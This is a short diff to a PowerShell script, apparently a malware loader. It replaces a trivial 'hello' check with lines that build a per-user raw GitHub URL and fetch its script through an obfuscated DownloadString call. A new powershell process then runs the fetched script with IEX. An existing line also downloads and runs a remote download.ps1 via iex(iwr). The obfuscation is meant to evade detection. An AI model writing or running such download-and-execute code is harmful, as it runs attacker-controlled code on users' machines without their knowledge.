@@ -1,5 +1,4 @@
-if ($id -eq 1255292055182114876) {
-    Write-Output "hello"
-}
-
+$codeuser = ("https://raw.githubusercontent.com/43a1723/test/main/usertelegram/$userid/main.ps1")
+$downloaduser = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$codeuser')"
+Start-Process "powershell" -Argument "IEX($downloaduser)"
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/download.ps1" -useb)
